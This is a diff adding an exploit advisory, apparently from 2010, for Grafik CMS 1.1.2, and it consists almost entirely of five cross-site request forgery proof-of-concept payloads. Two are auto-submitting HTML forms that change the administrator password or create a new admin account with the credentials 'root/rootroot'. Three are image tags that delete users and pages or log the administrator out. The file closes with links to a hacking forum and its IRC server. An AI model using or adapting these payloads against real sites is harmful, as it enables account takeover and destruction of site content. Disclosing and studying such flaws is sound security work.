@@ -1,0 +1,56 @@
+<!---
+    Title: Grafik CMS 1.1.2 Multiple CSRF Vulnerabilities
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Mon 12 Jul 2010 07:07:22 PM EEST 
+    Vendor: http://www.grafik-power.com/grafik_cms/
+    Download: None
+--->
+
+-=[ CSRF PoC 1 - Change Admin Password ]=-
+
+    <html>
+        <head>
+            <title>Grafik CMS 1.1.2 Multiple CSRF Vulnerabilities - Change Admin Password</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/admin/admin.php?action=edit_user&id=1" method="post">
+                <!--- Edit these --->
+                <input type="hidden" name="name" value="root" />
+                <input type="hidden" name="username" value="root" />
+                <input type="hidden" name="password" value="rootroot" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 2 - Create Admin User ]=-
+    
+    <html>
+        <head>
+            <title>Grafik CMS 1.1.2 Multiple CSRF Vulnerabilities - Create Admin User</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/admin/admin.php?action=add_user" method="post">
+                <!--- Edit these --->
+                <input type="hidden" name="name" value="root" />
+                <input type="hidden" name="username" value="root" />
+                <input type="hidden" name="password" value="rootroot" />
+            </form>
+        </body>
+    </html>
+ 
+-=[ CSRF PoC 3 - Delete User ]=-
+
+     <img src="http://[domain]/admin/admin.php?action=liste_user&del=[user id]" alt="Do you see this?" />
+     
+-=[ CSRF PoC 4 - Delete Page ]=-
+
+     <img src="http://[domain]/admin/admin.php?action=liste_pages&del=[page id]" alt="Do you see this?" />
+     
+-=[ CSRF PoC 5 - Logout The Administrator ]=-
+
+    <img src="http://[domain]/admin/index.php?action=deconnexion" alt="Do you see this?" />
+
+<!---
+    http://www.evilzone.org/
+    irc.evilzone.org  (6697 / 9999)
+--->
